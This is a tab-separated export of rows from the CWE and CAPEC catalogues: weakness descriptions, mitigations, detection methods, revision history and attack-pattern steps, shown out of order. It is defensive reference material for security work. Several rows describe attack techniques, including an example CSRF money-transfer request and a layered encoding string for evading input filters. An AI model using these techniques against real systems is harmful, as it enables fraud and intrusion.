24705	28	CWE Content Team
16952	25	Low
22677	96	2009-10-21
6872	104	300
18777	59	Updated References
15810	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
16110	79	Confidentiality
6429	66	OWASP TOP 10
20824	95	The server treats this as just another handshake and responds by encrypting the challenge and issuing its own to the attacker
17342	62	updated Name, Relationships
21733	79	Integrity
8534	39	2008-10-14
13164	54	Low
16447	42	Use any access control that is offered by the functionality that is offering the lock.
10257	91	Operation
13751	63	Read Application Data
23483	77	Manual Static Analysis - Binary or Bytecode
8612	50	Validate XML against a valid schema or DTD prior to parsing.
13453	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
13724	72	If a null character is omitted from a string, then most string-copying functions will read data until they locate a null character, even outside of the intended boundaries of the string. This could: cause a crash due to a segmentation fault cause sensitive adjacent memory to be copied and sent to an outsider trigger a buffer overflow when the copy is being written to a fixed-size buffer.
20916	28	Eric Dalci
24757	28	Eric Dalci
14175	50	Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages.                The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message.
21649	103	Primary
8345	78	High
7516	89	Detailed
17815	39	2012-05-11
22090	62	updated Related_Attack_Patterns, Type
8066	74	2
10396	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
19206	35	MITRE
6082	35	MITRE
21978	62	updated Related_Attack_Patterns
19933	28	Eric Dalci
19891	104	1127
11160	104	40
11302	91	Operation
24492	26	Implementation
5608	62	updated Common_Consequences, Potential_Mitigations, References
23330	77	Manual Analysis
12923	28	CWE Content Team
16140	21	CWE Content Team
9694	35	MITRE
6044	62	updated Potential_Mitigations, References, Relationships
7949	31	699
13250	59	Updated Related_Attack_Patterns
21361	78	High
20737	101	CAPEC Content Team
25112	62	updated Relationships
20750	39	2009-01-12
24585	62	updated Potential_Mitigations
20784	59	Updated Related_Attack_Patterns
9084	39	2008-09-08
21695	39	2017-11-08
19768	35	MITRE
21525	51	2014-06-23
24588	69	Draft
11796	23	The software does not properly control the allocation and maintenance of a limited resource thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources.
19158	39	2008-10-14
24994	100	The MITRE Corporation
9774	91	Architecture and Design
22902	74	2
19876	88	Excessive Use of Self-Modifying Code
6484	28	CWE Content Team
23771	39	2012-05-11
10645	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
20602	103	Primary
22738	28	CWE Content Team
25436	56	ChildOf
8371	28	Eric Dalci
6279	60	25
14342	39	2019-06-20
5859	62	updated Relationships
15653	50	Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.
13911	91	Implementation
17164	62	updated Potential_Mitigations
18057	39	2012-10-30
5970	89	Detailed
17559	100	The MITRE Corporation
21339	39	2018-03-27
19718	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
23627	35	MITRE
13089	81	Other
13596	39	2009-10-29
12045	95	[Spider] Using a browser or an automated tool, an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file, he lists how to pass global parameters to the Flash file from the embedding object.
22469	46	The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).
9363	39	2009-07-27
24097	46	This issue makes it more difficult to maintain the software due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
21836	63	Gain Privileges or Assume Identity
24213	26	Build and Compilation
7150	35	Cigital
19969	35	MITRE
10924	39	2011-09-13
15566	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
17908	35	MITRE
6334	59	Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit
16795	90	SQL
22919	39	2010-02-16
22417	35	MITRE
19621	67	Low
14593	62	updated Potential_Mitigations, Time_of_Introduction
24108	39	2012-05-11
17870	31	699
22065	69	Draft
24965	81	Other
8407	69	Draft
10241	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships
23253	31	1003
23820	39	2008-09-08
25167	39	2017-05-03
10316	51	2015-11-09
15105	55	CAPEC Content Team
14386	28	CWE Content Team
17019	35	MITRE
16982	47	Execute Unauthorized Commands
25170	43	Simple
23048	101	CAPEC Content Team
8443	74	3
17768	100	The MITRE Corporation
11271	39	2011-09-13
25332	39	2014-07-30
13497	85	179
24607	73	Finding weaknesses in functionality used by both privileged and unprivileged users.
16322	35	MITRE
25434	28	CWE Content Team
16403	62	updated Common_Consequences
17362	35	MITRE
15379	54	Medium
24435	61	Draft
7523	24	MITRE
11179	92	Exploit
5627	49	2011
10695	31	1003
16446	91	Implementation
17160	39	2017-11-08
17625	28	CWE Content Team
20010	39	2008-09-08
11028	104	359
20118	47	Hide Activities
20201	39	2010-02-16
22163	26	Architecture and Design
6555	35	MITRE
25142	39	2011-06-01
23220	89	Detailed
23941	42	Always verify the integrity of the software that is being installed.
9807	35	MITRE
16158	31	699
24423	39	2010-09-27
9454	61	Draft
10984	62	updated Common_Consequences
12313	35	MITRE
8686	62	updated Common_Consequences
25016	96	2018-07-02
24048	103	Primary
22465	72	An attacker could include arguments that allow unintended commands or code to be executed, allow sensitive data to be read or modified or could cause other unintended behavior.
6424	101	CAPEC Content Team
20510	79	Confidentiality
24726	104	583
5634	90	Language-Independent
7167	59	Updated Related_Weaknesses
16597	30	Nicholas Hopper
8027	35	MITRE
11061	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
17125	23	Security based on event locations are insecure and can be spoofed.
5747	62	updated Demonstrative_Examples, References
11161	42	Ensure that all arguments are verified, as defined by the API you are protecting.
5903	28	CWE Content Team
20570	62	updated Time_of_Introduction
13473	69	Draft
9251	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
22855	56	ChildOf
11688	89	Detailed
9637	25	Low
25330	35	MITRE
17733	23	An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.
12123	62	updated References
14378	79	Confidentiality
6410	39	2017-01-19
6623	35	MITRE
18495	69	Draft
24217	35	MITRE
17815	28	CWE Content Team
12636	85	297
12994	62	updated Demonstrative_Examples, Description, Name
19570	39	2008-07-01
20222	23	A named-callable or method control element has a signature that      supports a variable (variadic) number of parameters or arguments.
17001	35	MITRE
10029	62	added/updated demonstrative examples
10948	89	Detailed
6162	62	updated Demonstrative_Examples
8118	23	The code has a synchronous call to a remote resource, but there is no timeout for the call, or the timeout is set to infinite.
6279	49	2012
14541	26	Implementation
11288	103	Primary
7257	39	2015-12-07
10995	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes.                   Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.
24737	21	CWE Content Team
16579	74	2
18137	23	This type of attack involves an attacker leveraging meta-characters in email headers to inject improper behavior into email programs. Email software has become increasingly sophisticated and feature-rich. In addition, email applications are ubiquitous and connected directly to the Web making them ideal targets to launch and propagate attacks. As the user demand for new functionality in email applications grows, they become more like browsers with complex rendering and plug in routines. As more email functionality is included and abstracted from the user, this creates opportunities for attackers. Virtually all email applications do not list email header information by default, however the email header contains valuable attacker vectors for the attacker to exploit particularly if the behavior of the email client application is known. Meta-characters are hidden from the user, but can contain scripts, enumerations, probes, and other attacks against the user's system.
8728	77	Automated Dynamic Analysis
13539	62	updated Common_Consequences
14755	63	DoS: Resource Consumption (Other)
23333	76	2017-01-09
7398	51	2014-06-23
9913	35	MITRE
10239	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
17479	28	CWE Content Team
18809	42	Use an input validation framework such as Struts.
17639	23	The software does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.
7854	81	Other
21984	102	ChildOf
8054	62	updated Relationships
23876	72	An attacker may be able to access memory that belongs to another process or user. If the attacker can control the contents that the IOCTL writes, it may lead to code execution at high privilege levels. At the least, a crash can occur.
10572	31	1000
15531	23	The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.
10962	62	updated Common_Consequences
15574	28	CWE Content Team
21015	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes, Theoretical_Notes
22437	31	699
21369	35	Cigital
9297	67	High
10645	91	Architecture and Design
17394	55	CAPEC Content Team
20960	62	updated Related_Attack_Patterns
24617	53	The MITRE Corporation
7193	81	Integrity
13710	28	CWE Content Team
21372	95	[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.
6853	90	C++
16919	103	Primary
5905	35	MITRE
19265	35	MITRE
6946	35	MITRE
22601	35	MITRE
9442	56	ChildOf
16581	42	Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the software. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
24835	39	2008-07-01
16059	56	CanAlsoBe
8754	31	699
7727	35	MITRE
7439	21	CWE Content Team
18467	21	PLOVER
18516	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
17184	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
11447	104	763
23577	39	2010-02-16
16899	28	CWE Content Team
14910	39	2012-05-11
18103	35	MITRE
18573	90	Language-Independent
16834	62	updated Time_of_Introduction
19634	56	PeerOf
13725	78	Medium
18026	47	Gain Privileges
15626	50	Operational: Use OS-level preventative functionality. Not a complete solution.
13257	35	Cigital
21883	96	2009-05-08
15833	28	CWE Content Team
14190	33	OWASP
21376	35	MITRE
13289	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
11352	62	Changed type from composite to weakness.
12409	40	The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.
7770	23	An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.
5807	61	Draft
19396	100	The MITRE Corporation
22334	97	SOAP Array Blowup
18058	62	updated Relationships
16054	56	ChildOf
22833	28	CWE Content Team
23663	39	2009-05-27
5639	62	updated Common_Consequences
10111	61	Stable
5737	28	CWE Content Team
13458	35	MITRE
24938	97	Task Impersonation
16980	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
18286	28	CWE Content Team
25032	35	MITRE
21203	39	2017-11-08
14700	42	When processing structured incoming data containing a size field followed by raw data, ensure that you identify and resolve any inconsistencies between the size field and the actual size of the data.
18906	103	Primary
24222	62	updated Taxonomy_Mappings
17446	62	updated Potential_Mitigations
20744	39	2010-04-05
9891	71	2004
20470	67	High
10148	35	MITRE
6569	76	2017-08-04
12090	103	Primary
8044	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
20093	73	Try to use different encodings of content in order to bypass validation routines.
21878	46	When an exception handling block (such as a Catch and Finally block) is used, but that block is empty, this can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
24389	43	Simple
18097	28	CWE Content Team
10952	35	MITRE
18726	39	2008-07-01
21847	39	2011-06-01
25390	39	2012-10-30
23715	55	CAPEC Content Team
20608	35	MITRE
15457	28	Eric Dalci
22553	61	Draft
11614	81	Integrity
24520	31	1000
22565	62	updated Relationships
8085	28	CWE Content Team
18989	98	VIEW LIST: CAPEC-1000: Mechanisms of Attack
20258	70	Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning
22139	60	03
13005	35	MITRE
15326	62	updated Demonstrative_Examples
22806	39	2008-07-01
22744	85	50
13155	35	MITRE
17880	91	Implementation
22543	49	2010
21724	35	MITRE
24633	62	updated References
21114	39	2008-07-01
17831	28	CWE Content Team
16414	100	The MITRE Corporation
21689	79	Confidentiality
13723	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
15570	35	MITRE
11967	28	CWE Content Team
8171	76	2017-05-01
16985	35	MITRE
14567	28	CWE Content Team
8928	54	Low
18812	39	2008-09-08
13785	73	Spidering web sites for inputs that involve potential filtering
10763	51	2014-06-23
22470	35	MITRE
10539	57	Indirect
10811	76	2017-08-04
14199	61	Draft
11898	28	CWE Content Team
5992	35	MITRE
18220	28	CWE Content Team
15958	43	Simple
16724	28	CWE Content Team
22009	69	Incomplete
20459	50	Patch web browser against known security origin policy bypass exploits.
11232	47	Read Data
11348	38	An attacker deleting temporary files can also be a sign that the attacker is trying to replace legitimate resources with malicious ones.
11133	91	Implementation
20855	31	1000
13304	35	MITRE
14619	100	The MITRE Corporation
22364	91	Architecture and Design
23091	45	Base
15304	62	updated Demonstrative_Examples, Potential_Mitigations, References, Relationships
14275	35	Cigital
23548	28	CWE Content Team
24665	62	updated Relationships
19987	103	Primary
22670	56	ChildOf
18657	39	2017-11-08
18669	104	775
15183	76	2017-08-04
20950	31	1000
12630	81	Availability
15028	56	ChildOf
8852	35	MITRE
15728	39	2014-07-30
6166	62	updated Relationships
13679	78	Very High
17701	28	CWE Content Team
18144	76	2017-08-04
7492	35	MITRE
20908	91	Implementation
15156	35	MITRE
17920	56	ChildOf
9532	39	2008-09-08
11942	87	Database Server
22987	91	Testing
17542	80	The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.
16415	62	updated Description
18844	39	2011-06-01
12720	88	Improper Restriction of Communication Channel to Intended Endpoints
12339	69	Incomplete
19820	59	Updated References
13700	39	2011-06-01
5618	101	CAPEC Content Team
6822	28	CWE Content Team
5798	39	2009-05-27
17834	77	Automated Dynamic Analysis
7302	28	CWE Content Team
17529	21	PLOVER
9665	101	CAPEC Content Team
12834	74	1
18647	81	Availability
22221	103	Primary
10508	45	Variant
24640	62	updated Time_of_Introduction
24581	35	MITRE
11158	62	updated Demonstrative_Examples
22896	46	For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.
21982	78	Medium
8604	47	Read Data
15231	99	McGraw-Hill
18519	35	MITRE
10559	28	CWE Content Team
21888	100	The MITRE Corporation
13922	95	[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.
23865	56	ChildOf
18525	81	Access Control
18032	92	Explore
10584	104	175
13463	101	CAPEC Content Team
15501	45	Class
10975	31	700
20619	46	Some glyphs, pictures, or icons can be semantically distinct to a program, while appearing very similar or identical to a human user. These are referred to as homoglyphs. For example, the lowercase "l" (ell) and uppercase "I" (eye) have different character codes, but these characters can be displayed in exactly the same way to a user, depending on the font. This can also occur between different character sets. For example, the Latin capital letter "A" and the Greek capital letter "Α" (Alpha) are treated as distinct by programs, but may be displayed in exactly the same way to a user. Accent marks may also cause letters to appear very similar, such as the Latin capital letter grave mark "À" and its equivalent "À" with the acute accent.             Adversaries can exploit this visual similarity for attacks such as phishing, e.g. by providing a link to an attacker-controlled hostname that looks like a hostname that the victim trusts. In a different use of homoglyphs, an adversary may create a back door username that is visually similar to the username of a regular user, which then makes it more difficult for a system administrator to detect the malicious username while reviewing logs.
21141	81	Integrity
18907	35	MITRE
17537	39	2019-09-19
19346	63	Read Application Data
22204	76	2019-04-04
8180	39	2012-05-11
9117	91	Implementation
21640	81	Confidentiality
17885	40	An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.
8166	100	The MITRE Corporation
7281	28	CWE Content Team
22193	96	2018-07-02
23879	62	updated Potential_Mitigations, Time_of_Introduction
15425	66	Third-Party Web Widget Security FAQ
8974	62	updated Alternate_Terms
16195	28	CWE Content Team
22883	88	Missing Release of Memory after Effective Lifetime
20133	28	CWE Content Team
13155	39	2010-02-16
17231	59	Updated Related_Attack_Patterns
16329	62	updated Relationships
22767	35	MITRE
20294	63	Modify Memory
10502	39	2009-05-27
20036	31	1000
14906	62	updated Relationships
7348	91	Implementation
24963	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
18474	26	Architecture and Design
9078	63	Unexpected State
5972	35	MITRE
16300	62	updated Potential_Mitigations
17845	70	mkstemp
20456	35	MITRE
14313	47	Read Data
9841	54	Medium
16128	28	Eric Dalci
18726	28	Eric Dalci
8051	50	Implementation: Server routines should be determined by content not determined by filename or file extension.
17887	101	CAPEC Content Team
24563	62	updated Potential_Mitigations
14664	48	03
5785	103	Primary
17237	62	updated Time_of_Introduction
17754	50	Design: Ensure that only legitimate HTTP verbs are allowed.
6845	90	Language-Independent
21175	42	When the data is stored or transmitted through untrusted sources that could modify the data, implement integrity checks to detect unauthorized modification, or store/transmit the data in a trusted location that is free from external influence.
24699	103	Primary
13683	47	Execute Unauthorized Commands
19516	100	The MITRE Corporation
21225	74	2
9901	33	Microsoft
19362	28	CWE Content Team
20559	35	MITRE
23465	90	C++
5784	61	Stable
19222	39	2008-09-08
23920	96	2018-07-02
15356	26	Implementation
11842	101	CAPEC Content Team
5831	81	Integrity
22057	27	The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.
23655	97	XML Quadratic Expansion
6867	62	updated Relationships
17402	62	updated Time_of_Introduction
22831	59	Updated Description Summary
24609	89	Detailed
19357	75	With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.
15451	81	Integrity
11124	101	CAPEC Content Team
15844	69	Draft
25052	35	MITRE
9411	63	Modify Files or Directories
15812	35	MITRE
11208	56	ChildOf
9409	39	2008-10-14
13875	97	Integer Attacks
15580	28	CWE Content Team
13357	62	updated Demonstrative_Examples, Relationships
13045	55	CAPEC Content Team
11552	89	Detailed
24841	43	Simple
8168	39	2012-05-11
11753	31	1000
14247	73	Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000)
10826	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
6670	62	updated Relationships, Taxonomy_Mappings, Type
23143	28	CWE Content Team
15471	100	The MITRE Corporation
17130	42	Avoid using vulnerable temp file functions.
8940	31	1003
18625	33	Tom Chothia
25334	88	Method Containing Access of a Member Element from Another Class
11183	23	An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.
9808	39	2011-06-01
19331	86	https://en.wikipedia.org/wiki/Cyclomatic_complexity
15001	101	CAPEC Content Team
20087	28	CWE Content Team
13220	23	The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information.
19749	23	The software calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.
9407	62	updated Observed_Examples, Relationships
16184	62	updated Relationships
22870	35	MITRE
8801	76	2017-08-04
8992	59	Updated Attacker_Skills_or_Knowledge_Required
16788	101	CAPEC Content Team
10389	91	Testing
20781	101	CAPEC Content Team
6944	59	Updated Related_Attack_Patterns
7550	100	The MITRE Corporation
11767	28	CWE Content Team
18913	76	2017-01-09
15933	39	2017-11-08
19745	81	Confidentiality
19086	63	Gain Privileges or Assume Identity
11579	50	Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach.
6778	92	Experiment
15562	85	72
6003	62	updated Applicable_Platforms
8115	23	An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its enormous advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed. RFC 793 defines the required behavior of any TCP/IP device in that an incoming connection request begins with a SYN packet, which in turn must be followed by a SYN/ACK packet from the receiving service. For this reason, like TCP Connect scanning, SYN scanning works against any TCP stack. Unlike TCP Connect scanning, it is possible to scan thousands of ports per second using this method. This type of scanning is usually referred to as 'half-open' scanning because it does not complete the three-way handshake. The scanning rate is extremely fast because no time is wasted completing the handshake or tearing down the connection. TCP SYN scanning can also immediately detect 3 of the 4 important types of port status: open, closed, and filtered. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. This technique allows an attacker to scan through stateful firewalls due to the common configuration that TCP SYN segments for a new connection will be allowed for almost any port. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered. A TCP Connect scan has the following characteristics:
8636	85	555
16202	92	Exploit
14059	102	ChildOf
18864	21	CWE Content Team
19910	35	MITRE
21911	62	updated Relationships, Taxonomy_Mappings
23669	21	PLOVER
11032	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
24762	101	CAPEC Content Team
23422	26	Implementation
15430	35	MITRE
7078	80	Exploiting a remote buffer overflow generated by attack
21555	35	MITRE
19557	39	2010-06-21
13825	35	MITRE
13865	56	ChildOf
18838	47	Read Data
21181	50	Verify that the user-supplied data does not use backslash character to escape malicious characters.
10354	62	added/updated demonstrative examples
7223	46	Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.
23328	28	CWE Content Team
22560	35	MITRE
7601	91	Architecture and Design
17290	56	ChildOf
10329	28	CWE Content Team
20627	28	CWE Content Team
8470	81	Confidentiality
20856	62	updated Demonstrative_Examples
15765	35	MITRE
15071	100	The MITRE Corporation
10951	51	2014-06-23
6785	45	Base
11831	62	updated Applicable_Platforms, Causal_Nature, Common_Consequences, Description, Likelihood_of_Exploit, Maintenance_Notes, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
19023	39	2012-10-30
14155	45	Base
13882	59	Updated Related_Attack_Patterns
17766	74	2
8150	39	2010-12-13
19648	39	2008-07-01
10760	88	Path Equivalence: '//multiple/leading/slash'
19534	28	CWE Content Team
14123	28	CWE Content Team
6316	103	Primary
18357	79	Integrity
20189	69	Incomplete
17050	35	MITRE
25244	70	WASC Threat Classification 2.0
16832	39	2009-07-27
8020	39	2017-11-08
13565	88	Excessive Attack Surface
25190	100	The MITRE Corporation
13952	31	1000
17293	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
10307	42	Requirements specification: The choice could be made to use a language that is not susceptible to these issues.
20552	102	ChildOf
24199	62	updated Potential_Mitigations
13446	62	updated Relationships, Taxonomy_Mappings
14759	31	699
9340	33	Microsoft
9376	95	Modify the content of each parameter according to observed error conditions
18507	61	Draft
11743	56	ChildOf
20315	28	CWE Content Team
5888	62	updated Relationships, Taxonomy_Mappings
24931	100	The MITRE Corporation
6472	104	316
6801	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
9160	103	Primary
9432	28	CWE Content Team
10260	28	CWE Content Team
18527	63	Reduce Maintainability
13888	35	MITRE
23722	88	Inefficient Algorithmic Complexity
19993	31	1000
15349	24	Cigital
17572	35	MITRE
15945	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.
12026	56	ChildOf
17591	63	DoS: Resource Consumption (Other)
6098	102	ChildOf
7653	28	CWE Content Team
23446	28	CWE Content Team
23568	33	Halvar Flake
15248	88	Double-Checked Locking
11527	26	Implementation
14371	56	ChildOf
15750	27	None: No specialized resources are required to execute this type of attack.
6615	28	CWE Content Team
17462	28	CWE Content Team
10897	28	CWE Content Team
25043	35	MITRE
15471	101	CAPEC Content Team
13614	35	MITRE
6438	51	2015-11-09
13570	80	Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.
19530	100	The MITRE Corporation
24524	101	CAPEC Content Team
9171	42	Ensure that locking occurs before the check, as opposed to afterwards, such that the resource, as checked, is the same as it is when in use.
9540	31	1003
16710	28	CWE Content Team
8585	103	Primary
20918	62	updated Relationships
13516	73	Combine multiple encodings and observe the effects. For example, the attacker might encode "." as "\.", and then, encode "\." as "&#92;&#46;", and then, encode that using URL encoding to "%26%2392%3B%26%2346%3B"
12733	43	Simple
15447	89	Detailed
8274	63	Read Application Data
7504	28	CWE Content Team
12357	45	Base
16268	42	Identify the system's resource intensive operations and consider protecting them from abuse (e.g. malicious automated script which runs the resources out).
15754	28	CWE Content Team
